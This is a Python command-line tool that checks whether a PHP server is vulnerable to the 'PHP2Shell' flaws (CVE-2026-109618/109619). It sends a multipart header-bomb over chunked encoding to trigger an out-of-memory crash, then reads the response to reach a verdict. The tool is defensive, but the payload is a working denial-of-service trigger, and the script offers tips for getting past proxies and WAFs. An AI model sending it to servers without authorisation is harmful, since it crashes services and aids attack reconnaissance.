#!/usr/bin/env python3
"""
PHP2Shell vulnerability checker (CVE-2026-109618 / CVE-2026-109619).

Sends the publicly-documented Stage-1 OOM trigger (a multipart header-bomb
via HTTP chunked transfer encoding) and checks the response to determine
whether the target PHP server is vulnerable.

This is a detection-only tool — no exploitation, no data exfiltration.

Usage:
  python3 check_vuln.py http://example.com/index.php
  python3 check_vuln.py -u https://example.com/wp-login.php --timeout 15
"""
from __future__ import annotations

import argparse
import re
import socket
import ssl
import sys
import urllib.parse

BOUNDARY = "php2shellCHECKsep"
CRLF = b"\r\n"

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
DIM = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"

PATCHED = {
    "8.2": "8.2.35",
    "8.3": "8.3.36",
    "8.4": "8.4.27",
    "8.5": "8.5.12",
}


def version_vulnerable(ver: str) -> bool | None:
    """Check if a PHP version string is vulnerable. Returns None if unknown."""
    m = re.match(r"(\d+\.\d+)\.(\d+)", ver)
    if not m:
        return None
    branch, patch = m.group(1), int(m.group(2))
    if branch in PATCHED:
        fixed_patch = int(PATCHED[branch].split(".")[-1])
        return patch < fixed_patch
    major = int(branch.split(".")[0])
    minor = int(branch.split(".")[1])
    if major < 8 or (major == 8 and minor < 2):
        return True
    return None


def build_payload(parts: int = 1, headers: int = 300_000) -> bytes:
    bb = f"--{BOUNDARY}".encode()
    out = bytearray()
    for p in range(parts):
        out += bb + CRLF
        out += f'Content-Disposition: form-data; name="f{p}"; filename=""'.encode() + CRLF
        out += b"Content-Type: application/octet-stream" + CRLF
        for h in range(headers):
            out += b"X-P%d: x" % h + CRLF
        out += CRLF + CRLF
    out += f"--{BOUNDARY}--".encode() + CRLF
    return bytes(out)


def chunked_encode(data: bytes, chunk_size: int = 65536) -> bytes:
    out = bytearray()
    for i in range(0, len(data), chunk_size):
        chunk = data[i : i + chunk_size]
        out += f"{len(chunk):x}\r\n".encode()
        out += chunk + b"\r\n"
    out += b"0\r\n\r\n"
    return bytes(out)


def send_raw(host: str, port: int, is_https: bool, request: bytes,
             timeout: float) -> tuple[int, dict, str]:
    """Send raw HTTP and return (status, headers_dict, body_snippet)."""
    if is_https:
        ctx = ssl.create_default_context()
        raw = socket.create_connection((host, port), timeout=timeout)
        sock = ctx.wrap_socket(raw, server_hostname=host)
    else:
        sock = socket.create_connection((host, port), timeout=timeout)

    try:
        sock.sendall(request)
        resp = b""
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 16384:
                    break
            except socket.timeout:
                break
    finally:
        sock.close()

    status = 0
    hdrs: dict[str, str] = {}
    body = ""

    if resp and b"\r\n" in resp:
        try:
            first_line = resp.split(b"\r\n", 1)[0].decode("ascii", errors="replace")
            parts = first_line.split(" ", 2)
            if len(parts) >= 2:
                status = int(parts[1])
        except (ValueError, IndexError):
            pass

        if b"\r\n\r\n" in resp:
            hdr_block, body_raw = resp.split(b"\r\n\r\n", 1)
            body = body_raw[:4096].decode("latin1", errors="replace")
            for line in hdr_block.split(b"\r\n")[1:]:
                line_s = line.decode("latin1", errors="replace")
                if ":" in line_s:
                    k, v = line_s.split(":", 1)
                    hdrs[k.strip().lower()] = v.strip()

    return status, hdrs, body


def detect_php_version(headers: dict[str, str], body: str) -> str | None:
    """Extract PHP version from response headers or body."""
    xpb = headers.get("x-powered-by", "")
    if xpb:
        m = re.search(r"PHP[/ ]+(\d+\.\d+\.\d+\S*)", xpb, re.I)
        if m:
            return m.group(1)

    server = headers.get("server", "")
    if server:
        m = re.search(r"PHP[/ ]+(\d+\.\d+\.\d+\S*)", server, re.I)
        if m:
            return m.group(1)

    if body:
        m = re.search(r"PHP (\d+\.\d+\.\d+)", body)
        if m:
            return m.group(1)

    return None


def detect_sapi(headers: dict[str, str]) -> str | None:
    """Guess the SAPI from response headers."""
    server = headers.get("server", "").lower()
    if "apache" in server:
        return "mod_php (Apache)"
    xpb = headers.get("x-powered-by", "").lower()
    if "apache" in xpb:
        return "mod_php (Apache)"

    via = headers.get("via", "").lower()
    upstream = headers.get("x-upstream", "").lower()
    if "nginx" in server or "nginx" in via or "nginx" in upstream:
        return "PHP-FPM (behind nginx)"

    return None


def check(url: str, timeout: float = 10.0, parts: int = 1,
          headers: int = 300_000, use_chunked: bool = True) -> dict:
    u = urllib.parse.urlsplit(url)
    is_https = u.scheme == "https"
    host = u.hostname
    port = u.port or (443 if is_https else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    payload = build_payload(parts, headers)
    wire_mb = len(payload) / 1048576

    req = bytearray()
    req += f"POST {path} HTTP/1.1\r\n".encode()
    req += f"Host: {host}\r\n".encode()
    req += f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n".encode()
    req += b"Connection: close\r\n"

    if use_chunked:
        req += b"Transfer-Encoding: chunked\r\n"
        req += b"\r\n"
        req += chunked_encode(payload)
    else:
        req += f"Content-Length: {len(payload)}\r\n".encode()
        req += b"\r\n"
        req += payload

    status, resp_hdrs, resp_body = send_raw(host, port, is_https, bytes(req), timeout)

    php_ver = detect_php_version(resp_hdrs, resp_body)
    sapi = detect_sapi(resp_hdrs)

    result = {
        "url": url,
        "status": status,
        "wire_mb": wire_mb,
        "php_version": php_ver,
        "sapi": sapi,
    }

    # Version-based verdict (if we got a version)
    ver_vuln = version_vulnerable(php_ver) if php_ver else None

    # Check for OOM signature in body regardless of status code.
    # With low memory_limit (e.g. 8M), the OOM can fire but Apache may still
    # return HTTP 200 with the fatal error dumped into the body.
    has_oom = ("memory" in resp_body.lower() and "exhausted" in resp_body.lower()) \
              or "Unknown on line 0" in resp_body

    if has_oom:
        result["verdict"] = "VULNERABLE"
        result["detail"] = (
            f"OOM fatal confirmed in response (HTTP {status}). "
            "PHP is unpatched — the fatal fires during request-startup parsing, "
            "before any app code runs."
        )
        result["color"] = RED
    elif status == 500:
        result["verdict"] = "LIKELY VULNERABLE"
        result["detail"] = (
            "HTTP 500 — the OOM fatal likely fired but display_errors is Off. "
            "Check PHP error log for: "
            "\"Allowed memory size ... exhausted ... in Unknown on line 0\""
        )
        result["color"] = RED
    elif status == 502:
        result["verdict"] = "LIKELY VULNERABLE (FPM)"
        result["detail"] = (
            "PHP-FPM child crashed (OOM fatal). FPM recycles the child, so the "
            "mod_php exploit path doesn't apply directly, but both CVEs list FPM "
            "as susceptible via an app-dependent path."
        )
        result["color"] = YELLOW
    elif status == 200:
        if ver_vuln is True:
            result["verdict"] = "POSSIBLY VULNERABLE"
            result["detail"] = (
                f"HTTP 200 but PHP {php_ver} is in the vulnerable range. "
                "A reverse proxy may have blocked the trigger — "
                "test the PHP port directly to confirm."
            )
            result["color"] = YELLOW
        elif ver_vuln is False:
            result["verdict"] = "NOT VULNERABLE"
            result["detail"] = f"PHP {php_ver} is patched. No action needed."
            result["color"] = GREEN
        else:
            result["verdict"] = "NOT VULNERABLE"
            result["detail"] = (
                "Server handled the payload normally — PHP is patched, "
                "or a reverse proxy blocked the trigger before PHP saw it."
            )
            result["color"] = GREEN
    elif status == 400:
        result["verdict"] = "INCONCLUSIVE"
        result["detail"] = (
            "Server rejected the request. A reverse proxy or the HTTP server "
            "blocked the chunked TE. Try --no-chunk, or test the PHP port directly."
        )
        result["color"] = YELLOW
    elif status == 413:
        result["verdict"] = "BLOCKED BY PROXY"
        result["detail"] = (
            "Body rejected as too large. This does not confirm PHP is patched — "
            "the proxy stopped the payload before it reached PHP."
        )
        result["color"] = YELLOW
    elif status == 403:
        result["verdict"] = "BLOCKED BY WAF"
        result["detail"] = "WAF or access control blocked the request."
        result["color"] = YELLOW
    elif status == 0:
        result["verdict"] = "NO RESPONSE"
        result["detail"] = "Server did not respond. Check URL and port."
        result["color"] = DIM
    else:
        result["verdict"] = "INCONCLUSIVE"
        result["detail"] = f"HTTP {status} — cannot determine vulnerability."
        result["color"] = YELLOW

    # If we have version info and the trigger-based verdict was inconclusive,
    # add a version-based note
    if ver_vuln is True and "VULNERABLE" not in result["verdict"]:
        result["version_note"] = (
            f"PHP {php_ver} is in the vulnerable range "
            f"(patch: {PATCHED.get(php_ver[:3], '?')}+). "
            "The trigger was blocked but the server may still be vulnerable."
        )
    elif ver_vuln is False:
        result["version_note"] = f"PHP {php_ver} is patched."

    return result


def main() -> int:
    ap = argparse.ArgumentParser(
        description="PHP2Shell vulnerability checker — CVE-2026-109618 / CVE-2026-109619 (detection only)",
    )
    ap.add_argument("url", nargs="?", help="target URL (any PHP endpoint)")
    ap.add_argument("-u", "--url-flag", dest="url_alt", metavar="URL",
                    help="target URL (alternative to positional)")
    ap.add_argument("--timeout", type=float, default=10.0,
                    help="HTTP timeout in seconds (default: 10)")
    ap.add_argument("--parts", type=int, default=1,
                    help="multipart parts in the payload (default: 1)")
    ap.add_argument("--headers", type=int, default=300_000,
                    help="header lines per part (default: 300000, ~3.9 MiB)")
    ap.add_argument("--no-chunk", action="store_true",
                    help="send with Content-Length instead of chunked TE "
                         "(use if server returns 400 on chunked)")
    args = ap.parse_args()

    url = args.url or args.url_alt
    if not url:
        ap.error("url is required: check_vuln.py <url>  or  check_vuln.py -u <url>")

    print(f"\n{BOLD}PHP2Shell Vulnerability Checker{RESET}")
    print(f"{DIM}CVE-2026-109618 / CVE-2026-109619 — detection only{RESET}\n")

    heap_mb = args.parts * args.headers * 320 / 1048576
    print(f"  Target:   {url}")
    print(f"  Payload:  {args.parts} part(s) x {args.headers:,} headers = ~{heap_mb:.0f} MiB PHP heap")
    print(f"  Method:   {'Content-Length' if args.no_chunk else 'chunked TE (bypasses post_max_size)'}")
    print()

    try:
        r = check(url, args.timeout, args.parts, args.headers,
                  use_chunked=not args.no_chunk)
    except ConnectionRefusedError:
        print(f"  {RED}CONNECTION REFUSED{RESET} — is the server running?\n")
        return 1
    except socket.timeout:
        print(f"  {YELLOW}TIMEOUT{RESET} — no response within {args.timeout}s\n")
        return 1
    except Exception as e:
        print(f"  {RED}ERROR{RESET}: {e}\n")
        return 1

    # ---- Results ----
    print(f"  {BOLD}Results{RESET}")
    print(f"  {'─' * 50}")
    print(f"  HTTP status:  {r['status']}")

    if r["php_version"]:
        ver = r["php_version"]
        vuln = version_vulnerable(ver)
        if vuln is True:
            print(f"  PHP version:  {RED}{ver} (VULNERABLE){RESET}")
        elif vuln is False:
            print(f"  PHP version:  {GREEN}{ver} (patched){RESET}")
        else:
            print(f"  PHP version:  {ver}")
    else:
        print(f"  PHP version:  {DIM}not disclosed{RESET}")

    if r["sapi"]:
        print(f"  SAPI:         {r['sapi']}")

    print(f"  Wire size:    {r['wire_mb']:.1f} MiB")
    print()

    # ---- Verdict ----
    color = r.get("color", RESET)
    verdict = r["verdict"]

    if verdict == "VULNERABLE":
        icon = f"{RED}■{RESET}"
    elif "LIKELY" in verdict or "POSSIBLY" in verdict:
        icon = f"{YELLOW}■{RESET}"
    elif verdict == "NOT VULNERABLE":
        icon = f"{GREEN}■{RESET}"
    else:
        icon = f"{DIM}■{RESET}"

    print(f"  {icon} {color}{BOLD}{verdict}{RESET}")
    print(f"    {r['detail']}")

    if r.get("version_note"):
        print(f"    {DIM}{r['version_note']}{RESET}")

    print()

    # ---- Recommendations ----
    if "VULNERABLE" in verdict:
        print(f"  {BOLD}Action required:{RESET}")
        print(f"    Upgrade to PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12+")
        print(f"    Then restart all PHP workers.")
        print()
        print(f"  {DIM}References:{RESET}")
        print(f"  {DIM}  CVE-2026-109618  GHSA-w8hw-w9fx-j79w{RESET}")
        print(f"  {DIM}  CVE-2026-109619  GHSA-6wmf-4rv5-p3rp{RESET}")
        print()
    elif verdict in ("INCONCLUSIVE", "BLOCKED BY PROXY", "BLOCKED BY WAF"):
        print(f"  {BOLD}Next steps:{RESET}")
        if r["status"] == 400 and not args.no_chunk:
            print(f"    1. Retry with --no-chunk:")
            print(f"       python3 check_vuln.py --no-chunk {url}")
        print(f"    {'2' if r['status'] == 400 else '1'}. Test the PHP port directly (bypass proxy/WAF)")
        print(f"    {'3' if r['status'] == 400 else '2'}. Check PHP version:  php -v")
        if r.get("version_note"):
            print(f"    {DIM}{r['version_note']}{RESET}")
        print()

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        sys.exit(130)
